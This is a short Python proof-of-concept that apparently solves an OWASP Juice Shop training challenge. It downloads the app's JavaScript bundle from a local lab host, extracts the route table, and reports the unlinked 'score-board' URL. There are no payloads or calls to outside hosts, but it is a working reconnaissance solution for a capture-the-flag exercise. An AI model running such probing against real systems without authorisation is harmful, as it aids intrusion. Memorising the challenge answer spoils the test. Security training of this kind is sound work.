#!/usr/bin/env python3
"""
c04-find-scoreboard PoC
Target: OWASP Juice Shop (host.docker.internal:3000)

Goal: discover the hidden, UI-unlinked "score board" page URL.

Method (static analysis of the client-side SPA bundle):
  1. Fetch index.html -> identify the JS bundle (main.js).
  2. Download main.js.
  3. Confirm the SPA uses hash-based routing (`useHash:!0`).
  4. Extract the route table and locate the `score-board` route.
  5. Reconstruct the exact URL: base + '/#/' + 'score-board'.
  6. Verify the route exists in the bundle (component bound) AND that the
     score-board side-nav link is gated behind the "Score Board" challenge
     (scoreBoardVisible) -> explains why it is not in the visible UI.
"""
import re
import sys
import urllib.request

BASE = "http://host.docker.internal:3000"
OUT = "/workspace/evidence/c4_scoreboard_url.txt"


def get(path):
    with urllib.request.urlopen(BASE + path, timeout=15) as r:
        return r.read().decode("utf-8", "replace")


def main():
    index = get("/")
    bundles = re.findall(r'src="([^"]+\.js)"', index)
    print(f"[*] JS bundles referenced: {bundles}")
    if "main.js" not in bundles:
        print("[-] main.js not referenced; aborting")
        return 1

    main_js = get("/main.js")
    print(f"[*] Downloaded main.js ({len(main_js)} bytes)")

    # 1) Routing strategy
    hash_routing = bool(re.search(r"useHash:\s*!0", main_js))
    print(f"[*] Hash-based routing (useHash:!0): {hash_routing}")

    # 2) Route table + score-board route
    routes = re.findall(r"\{path:`([^`]*)`,component", main_js)
    print(f"[*] Discovered {len(routes)} routes")
    if "score-board" not in routes:
        print("[-] 'score-board' route NOT found in bundle")
        return 1
    print("[+] Route found in router config: {path:`score-board`, component:...}")

    # 3) Component binding sanity check
    has_component = bool(re.search(r"selectors:\[\[`app-score-board`\]\]", main_js))
    print(f"[+] 'app-score-board' component defined: {has_component}")

    # 4) Why it's hidden: nav link gated on scoreBoardVisible (challenge solved)
    hidden = bool(re.search(r"scoreBoardVisible", main_js))
    print(f"[*] Nav link gated behind scoreBoardVisible flag: {hidden}")

    # 5) Build exact URL
    if hash_routing:
        url = f"{BASE}/#/score-board"
    else:
        url = f"{BASE}/score-board"

    print(f"[+] SCORE BOARD URL: {url}")

    # 6) Server reachability sanity (SPA returns index.html for any path)
    with urllib.request.urlopen(BASE + "/score-board", timeout=15) as r:
        print(f"[*] GET /score-board -> HTTP {r.status} ({len(r.read())} bytes, SPA shell)")

    with open(OUT, "w", newline="\n") as f:
        f.write(url + "\n")
    print(f"[+] Saved -> {OUT}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
